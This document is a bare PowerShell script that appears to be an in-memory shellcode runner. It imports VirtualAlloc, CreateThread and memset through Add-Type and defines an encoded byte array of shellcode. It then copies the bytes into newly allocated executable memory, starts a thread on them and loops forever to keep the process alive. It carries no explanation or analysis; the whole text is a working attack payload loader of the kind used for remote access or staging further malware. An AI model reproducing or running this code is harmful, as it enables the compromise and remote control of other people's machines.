$LQ6C = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $LQ6C -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc5,0xba,0x56,0x97,0x27,0x96,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x14,0x03,0x56,0x42,0x75,0xd2,0x6a,0x82,0xfb,0x1d,0x93,0x52,0x9c,0x94,0x76,0x63,0x9c,0xc3,0xf3,0xd3,0x2c,0x87,0x56,0xdf,0xc7,0xc5,0x42,0x54,0xa5,0xc1,0x65,0xdd,0x00,0x34,0x4b,0xde,0x39,0x04,0xca,0x5c,0x40,0x59,0x2c,0x5d,0x8b,0xac,0x2d,0x9a,0xf6,0x5d,0x7f,0x73,0x7c,0xf3,0x90,0xf0,0xc8,0xc8,0x1b,0x4a,0xdc,0x48,0xff,0x1a,0xdf,0x79,0xae,0x11,0x86,0x59,0x50,0xf6,0xb2,0xd3,0x4a,0x1b,0xfe,0xaa,0xe1,0xef,0x74,0x2d,0x20,0x3e,0x74,0x82,0x0d,0x8f,0x87,0xda,0x4a,0x37,0x78,0xa9,0xa2,0x44,0x05,0xaa,0x70,0x37,0xd1,0x3f,0x63,0x9f,0x92,0x98,0x4f,0x1e,0x76,0x7e,0x1b,0x2c,0x33,0xf4,0x43,0x30,0xc2,0xd9,0xff,0x4c,0x4f,0xdc,0x2f,0xc5,0x0b,0xfb,0xeb,0x8e,0xc8,0x62,0xad,0x6a,0xbe,0x9b,0xad,0xd5,0x1f,0x3e,0xa5,0xfb,0x74,0x33,0xe4,0x93,0xb9,0x7e,0x17,0x63,0xd6,0x09,0x64,0x51,0x79,0xa2,0xe2,0xd9,0xf2,0x6c,0xf4,0x1e,0x29,0xc8,0x6a,0xe1,0xd2,0x29,0xa2,0x25,0x86,0x79,0xdc,0x8c,0xa7,0x11,0x1c,0x31,0x72,0x8f,0x19,0xa5,0xbd,0xf8,0x22,0x3f,0x56,0xfb,0x22,0x20,0x36,0x72,0xc4,0x0e,0x66,0xd5,0x59,0xee,0xd6,0x95,0x09,0x86,0x3c,0x1a,0x75,0xb6,0x3e,0xf0,0x1e,0x5c,0xd1,0xad,0x77,0xc8,0x48,0xf4,0x0c,0x69,0x94,0x22,0x69,0xa9,0x1e,0xc1,0x8d,0x67,0xd7,0xac,0x9d,0x1f,0x17,0xfb,0xfc,0x89,0x28,0xd1,0x6b,0x35,0xbd,0xde,0x3d,0x62,0x29,0xdd,0x18,0x44,0xf6,0x1e,0x4f,0xdf,0x3f,0x8b,0x30,0xb7,0x3f,0x5b,0xb1,0x47,0x16,0x31,0xb1,0x2f,0xce,0x61,0xe2,0x4a,0x11,0xbc,0x96,0xc7,0x84,0x3f,0xcf,0xb4,0x0f,0x28,0xed,0xe3,0x78,0xf7,0x0e,0xc6,0x78,0xcb,0xd8,0x2e,0x0f,0x25,0xd9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$6u5c=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($6u5c.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$6u5c,0,0,0);for (;;){Start-sleep 60};